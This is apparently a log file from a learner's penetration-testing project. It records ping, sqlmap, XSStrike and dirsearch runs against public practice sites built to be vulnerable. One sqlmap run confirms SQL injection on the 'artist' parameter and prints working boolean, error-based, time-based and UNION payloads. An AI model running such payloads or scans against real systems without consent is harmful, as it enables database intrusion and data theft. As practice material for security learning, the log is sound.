@@ -1,0 +1,386 @@
+[2025-05-15 21:27:27] PING scan on http://example.com
+
+Pinging example.com [23.192.228.80] with 32 bytes of data:
+Reply from 23.192.228.80: bytes=32 time=392ms TTL=40
+Reply from 23.192.228.80: bytes=32 time=409ms TTL=40
+Reply from 23.192.228.80: bytes=32 time=528ms TTL=40
+Reply from 23.192.228.80: bytes=32 time=740ms TTL=40
+
+Ping statistics for 23.192.228.80:
+    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 392ms, Maximum = 740ms, Average = 517ms
+
+[2025-05-15 21:27:45] SQLMAP scan on http://example.com
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.5.21#dev}
+|_ -| . [,]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 21:27:43 /2025-05-15/
+
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[21:27:43] [INFO] starting crawler for target URL 'http://example.com'
+[21:27:43] [INFO] searching for links with depth 1
+[21:27:45] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 21:27:45 /2025-05-15/
+
+
+[2025-05-15 21:30:55] SQLMAP scan on http://testphp.vulnweb.com
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.9.5.21#dev}
+|_ -| . [']     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 21:30:54 /2025-05-15/
+
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[21:30:54] [INFO] starting crawler for target URL 'http://testphp.vulnweb.com'
+[21:30:54] [INFO] searching for links with depth 1
+[21:30:55] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 21:30:55 /2025-05-15/
+
+
+[2025-05-15 21:31:42] SQLMAP scan on http://testphp.vulnweb.com
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.9.5.21#dev}
+|_ -| . [,]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 21:31:39 /2025-05-15/
+
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[21:31:39] [INFO] starting crawler for target URL 'http://testphp.vulnweb.com'
+[21:31:39] [INFO] searching for links with depth 1
+[21:31:41] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 21:31:42 /2025-05-15/
+
+
+[2025-05-15 21:31:55] PING scan on http://testphp.vulnweb.com/artists.php?artist=1
+
+Pinging testphp.vulnweb.com [44.228.249.3] with 32 bytes of data:
+Reply from 44.228.249.3: bytes=32 time=413ms TTL=44
+Reply from 44.228.249.3: bytes=32 time=345ms TTL=44
+Reply from 44.228.249.3: bytes=32 time=346ms TTL=44
+Reply from 44.228.249.3: bytes=32 time=328ms TTL=44
+
+Ping statistics for 44.228.249.3:
+    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 328ms, Maximum = 413ms, Average = 358ms
+
+[2025-05-15 21:32:13] SQLMAP scan on http://testphp.vulnweb.com/artists.php?artist=1
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.5.21#dev}
+|_ -| . [(]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 21:32:04 /2025-05-15/
+
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[21:32:04] [INFO] starting crawler for target URL 'http://testphp.vulnweb.com/artists.php?artist=1'
+[21:32:04] [INFO] searching for links with depth 1
+do you want to normalize crawling results [Y/n] Y
+do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] N
+[21:32:06] [INFO] found a total of 3 targets
+[1/3] URL:
+GET http://testphp.vulnweb.com/artists.php?artist=1
+do you want to test this URL? [Y/n/q]
+> Y
+[21:32:06] [INFO] testing URL 'http://testphp.vulnweb.com/artists.php?artist=1'
+[21:32:06] [INFO] using 'C:\Users\mg\AppData\Local\sqlmap\output\results-05152025_0932pm.csv' as the CSV results file in multiple targets mode
+[21:32:06] [INFO] testing connection to the target URL
+[21:32:07] [INFO] checking if the target is protected by some kind of WAF/IPS
+^C
+
+[2025-05-15 21:32:13] SQLMAP scan on http://testphp.vulnweb.com/artists.php?artist=1
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.5.21#dev}
+|_ -| . [']     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 21:31:04 /2025-05-15/
+
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[21:31:05] [INFO] starting crawler for target URL 'http://testphp.vulnweb.com/artists.php?artist=1'
+[21:31:05] [INFO] searching for links with depth 1
+do you want to normalize crawling results [Y/n] Y
+do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] N
+[1/1] URL:
+GET http://testphp.vulnweb.com/artists.php?artist=1
+do you want to test this URL? [Y/n/q]
+> Y
+[21:31:07] [INFO] testing URL 'http://testphp.vulnweb.com/artists.php?artist=1'
+[21:31:07] [INFO] using 'C:\Users\mg\AppData\Local\sqlmap\output\results-05152025_0931pm.csv' as the CSV results file in multiple targets mode
+[21:31:07] [INFO] testing connection to the target URL
+[21:31:07] [INFO] checking if the target is protected by some kind of WAF/IPS
+[21:31:08] [INFO] testing if the target URL content is stable
+[21:31:08] [INFO] target URL content is stable
+[21:31:08] [INFO] testing if GET parameter 'artist' is dynamic
+[21:31:09] [INFO] GET parameter 'artist' appears to be dynamic
+[21:31:09] [INFO] heuristic (basic) test shows that GET parameter 'artist' might be injectable (possible DBMS: 'MySQL')
+[21:31:10] [INFO] heuristic (XSS) test shows that GET parameter 'artist' might be vulnerable to cross-site scripting (XSS) attacks
+[21:31:10] [INFO] testing for SQL injection on GET parameter 'artist'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[21:31:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[21:31:11] [WARNING] reflective value(s) found and filtering out
+[21:31:14] [INFO] GET parameter 'artist' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="sem")
+[21:31:14] [INFO] testing 'Generic inline queries'
+[21:31:15] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[21:31:16] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[21:31:16] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[21:31:17] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[21:31:17] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[21:31:19] [INFO] GET parameter 'artist' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
+[21:31:19] [INFO] testing 'MySQL inline queries'
+[21:31:19] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[21:31:19] [WARNING] time-based comparison requires larger statistical model, please wait............... (done)
+[21:31:31] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[21:31:37] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[21:31:58] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[21:31:58] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')
+[21:32:01] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[21:32:02] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[21:32:03] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[21:32:04] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[21:32:04] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
+[21:32:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
+[21:32:06] [CRITICAL] connection was forcibly closed by the target URL
+[21:32:06] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
+
+[2025-05-15 21:32:13] SQLMAP scan on http://testphp.vulnweb.com/artists.php?artist=1
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.9.5.21#dev}
+|_ -| . [)]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 21:30:42 /2025-05-15/
+
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[21:30:42] [INFO] starting crawler for target URL 'http://testphp.vulnweb.com/artists.php?artist=1'
+[21:30:42] [INFO] searching for links with depth 1
+do you want to normalize crawling results [Y/n] Y
+do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] N
+[21:30:45] [INFO] found a total of 3 targets
+[1/3] URL:
+GET http://testphp.vulnweb.com/artists.php?artist=1
+do you want to test this URL? [Y/n/q]
+> Y
+[21:30:45] [INFO] testing URL 'http://testphp.vulnweb.com/artists.php?artist=1'
+[21:30:45] [INFO] using 'C:\Users\mg\AppData\Local\sqlmap\output\results-05152025_0930pm.csv' as the CSV results file in multiple targets mode
+[21:30:45] [INFO] testing connection to the target URL
+[21:30:46] [INFO] checking if the target is protected by some kind of WAF/IPS
+[21:30:47] [INFO] testing if the target URL content is stable
+[21:30:51] [INFO] target URL content is stable
+[21:30:51] [INFO] testing if GET parameter 'artist' is dynamic
+[21:30:52] [INFO] GET parameter 'artist' appears to be dynamic
+[21:30:53] [INFO] heuristic (basic) test shows that GET parameter 'artist' might be injectable (possible DBMS: 'MySQL')
+[21:30:54] [INFO] heuristic (XSS) test shows that GET parameter 'artist' might be vulnerable to cross-site scripting (XSS) attacks
+[21:30:54] [INFO] testing for SQL injection on GET parameter 'artist'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[21:30:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[21:30:54] [WARNING] reflective value(s) found and filtering out
+[21:30:59] [INFO] GET parameter 'artist' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="sem")
+[21:30:59] [INFO] testing 'Generic inline queries'
+[21:30:59] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[21:31:00] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[21:31:00] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[21:31:01] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[21:31:01] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[21:31:02] [INFO] GET parameter 'artist' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
+[21:31:02] [INFO] testing 'MySQL inline queries'
+[21:31:02] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[21:31:02] [WARNING] time-based comparison requires larger statistical model, please wait............... (done)
+[21:31:14] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
+[21:31:14] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[21:31:15] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[21:31:16] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[21:31:17] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[21:31:17] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[21:31:17] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[21:31:30] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
+[21:31:43] [INFO] GET parameter 'artist' appears to be 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)' injectable 
+[21:31:43] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[21:31:43] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[21:31:44] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[21:31:47] [INFO] target URL appears to have 3 columns in query
+[21:31:56] [INFO] GET parameter 'artist' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'artist' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 53 HTTP(s) requests:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artist=1 AND 8541=8541
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: artist=1 AND GTID_SUBSET(CONCAT(0x716a6a6b71,(SELECT (ELT(6581=6581,1))),0x717a766a71),6581)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
+    Payload: artist=1 OR (SELECT 9036 FROM (SELECT(SLEEP(5)))AaOu)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-9580 UNION ALL SELECT CONCAT(0x716a6a6b71,0x7a6a6f7463586d6143687a577a684b436e616c6c6c6c694f6c43584872556f646e636c774e697758,0x717a766a71),NULL,NULL-- -
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[21:31:57] [INFO] the back-end DBMS is MySQL
+[21:32:11] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+^C
+
+[2025-05-15 21:32:13] SQLMAP scan on http://testphp.vulnweb.com/artists.php?artist=1
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.5.21#dev}
+|_ -| . [)]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 21:30:01 /2025-05-15/
+
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[21:30:01] [INFO] starting crawler for target URL 'http://testphp.vulnweb.com/artists.php?artist=1'
+[21:30:01] [INFO] searching for links with depth 1
+do you want to normalize crawling results [Y/n] Y
+do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] N
+[1/1] URL:
+GET http://testphp.vulnweb.com/artists.php?artist=1
+do you want to test this URL? [Y/n/q]
+> Y
+[21:30:03] [INFO] testing URL 'http://testphp.vulnweb.com/artists.php?artist=1'
+[21:30:03] [INFO] using 'C:\Users\mg\AppData\Local\sqlmap\output\results-05152025_0930pm.csv' as the CSV results file in multiple targets mode
+[21:30:03] [INFO] testing connection to the target URL
+[21:30:03] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
+[21:30:03] [INFO] checking if the target is protected by some kind of WAF/IPS
+[21:30:04] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
+are you sure that you want to continue with further target testing? [Y/n] Y
+[21:30:04] [WARNING] please consider usage of tamper scripts (option '--tamper')
+[21:30:04] [INFO] testing if the target URL content is stable
+[21:30:07] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[21:30:07] [INFO] searching for dynamic content
+[21:30:08] [CRITICAL] target URL content appears to be heavily dynamic. sqlmap is going to retry the request(s)
+[21:30:11] [WARNING] target URL content appears to be too dynamic. Switching to '--text-only' 
+[21:30:11] [INFO] testing if GET parameter 'artist' is dynamic
+[21:30:12] [INFO] GET parameter 'artist' appears to be dynamic
+[21:30:12] [INFO] testing for SQL injection on GET parameter 'artist'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[21:30:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[21:30:13] [WARNING] reflective value(s) found and filtering out
+[21:30:19] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[21:30:20] [INFO] testing 'Generic inline queries'
+[21:30:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[21:31:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[21:31:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+^C
+
+[2025-05-15 21:38:19] XSS scan on http://xss-game.appspot.com/level1/frame  
+Collecting fuzzywuzzy
+  Downloading fuzzywuzzy-0.18.0-py2.py3-none-any.whl.metadata (4.9 kB)
+Downloading fuzzywuzzy-0.18.0-py2.py3-none-any.whl (18 kB)
+Installing collected packages: fuzzywuzzy
+Successfully installed fuzzywuzzy-0.18.0
+
+[notice] A new release of pip is available: 25.0.1 -> 25.1.1
+[notice] To update, run: python.exe -m pip install --upgrade pip
+[91m
+	XSStrike [97mv3.1.5
+[0m
+[93m[!][0m fuzzywuzzy isn't installed, installing now.
+[93m[!][0m fuzzywuzzy has been installed, restart XSStrike.
+
+[2025-05-15 21:40:48] DIRSEARCH scan on http://demo.testfire.net   
+Traceback (most recent call last):
+  File "C:\Users\mg\Desktop\Pentesting project\dirsearch\dirsearch.py", line 32, in <module>
+    from lib.core.installation import check_dependencies, install_dependencies
+  File "C:\Users\mg\Desktop\Pentesting project\dirsearch\lib\core\installation.py", line 24, in <module>
+    import pkg_resources
+ModuleNotFoundError: No module named 'pkg_resources'
+
+[2025-05-15 21:42:05] DIRSEARCH scan on http://demo.testfire.net   
+Traceback (most recent call last):
+  File "C:\Users\mg\Desktop\Pentesting project\dirsearch\dirsearch.py", line 32, in <module>
+    from lib.core.installation import check_dependencies, install_dependencies
+  File "C:\Users\mg\Desktop\Pentesting project\dirsearch\lib\core\installation.py", line 24, in <module>
+    import pkg_resources
+ModuleNotFoundError: No module named 'pkg_resources'
+
+[2025-05-16 13:19:46] XSS scan on http://xss-game.appspot.com/level1/frame  
+[91m
+	XSStrike [97mv3.1.5
+[0m
+[97m[~][0m Crawling the target [0m
+[97m[~][0m Parsing level1/frame                            
+ [0m
+[93m[!][0m Progress: 1/1
+ [0m
+
+
+[2025-05-16 13:20:12] SQLMAP scan on http://testphp.vulnweb.com/artists.php?artist=1
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.9.5.21#dev}
+|_ -| . [.]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 13:20:11 /2025-05-16/
+
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[13:20:11] [INFO] starting crawler for target URL 'http://testphp.vulnweb.com/artists.php?artist=1'
+[13:20:11] [INFO] searching for links with depth 1
+[13:20:11] [CRITICAL] unable to connect to the target URL ('getaddrinfo failed'). sqlmap is going to retry the request(s)
+[13:20:11] [WARNING] if the problem persists please check that the provided target URL is reachable. In case that it is, you can try to rerun with switch '--random-agent' and/or proxy switches ('--proxy', '--proxy-file'...)
+[13:20:11] [CRITICAL] connection exception detected ('unable to connect to the target URL ('getaddrinfo failed')'). skipping URL 'http://testphp.vulnweb.com'
+[13:20:11] [CRITICAL] unable to connect to the target URL ('getaddrinfo failed'). sqlmap is going to retry the request(s)
+[13:20:12] [CRITICAL] connection exception detected ('unable to connect to the target URL ('getaddrinfo failed')'). skipping URL 'http://testphp.vulnweb.com/artists.php?artist=1'
+do you want to normalize crawling results [Y/n] Y
+do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] N
+[1/1] URL:
+GET http://testphp.vulnweb.com/artists.php?artist=1
+do you want to test this URL? [Y/n/q]
+> Y
+[13:20:12] [INFO] testing URL 'http://testphp.vulnweb.com/artists.php?artist=1'
+[13:20:12] [INFO] using 'C:\Users\mg\AppData\Local\sqlmap\output\results-05162025_0120pm.csv' as the CSV results file in multiple targets mode
+[13:20:12] [ERROR] host 'testphp.vulnweb.com' does not exist, skipping to the next target
+[13:20:12] [INFO] you can find results of scanning in multiple targets mode inside the CSV file 'C:\Users\mg\AppData\Local\sqlmap\output\results-05162025_0120pm.csv'
+
+[*] ending @ 13:20:12 /2025-05-16/
+
+
